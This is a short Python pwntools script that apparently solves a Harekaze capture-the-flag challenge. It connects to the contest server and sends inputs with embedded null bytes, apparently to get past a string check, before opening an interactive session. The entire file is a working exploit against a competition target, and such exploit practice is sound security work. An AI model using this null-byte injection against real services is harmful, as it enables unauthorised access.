#!/usr/bin/env python
from pwn import *

#r = process('/tmp/p/a')
r = remote('problem.harekaze.com', 20328)
r.sendlineafter(": ","cow\x00aaaaisoroku\x00")
r.sendlineafter(": ","\x00")
r.sendlineafter(": ","cow")


r.interactive()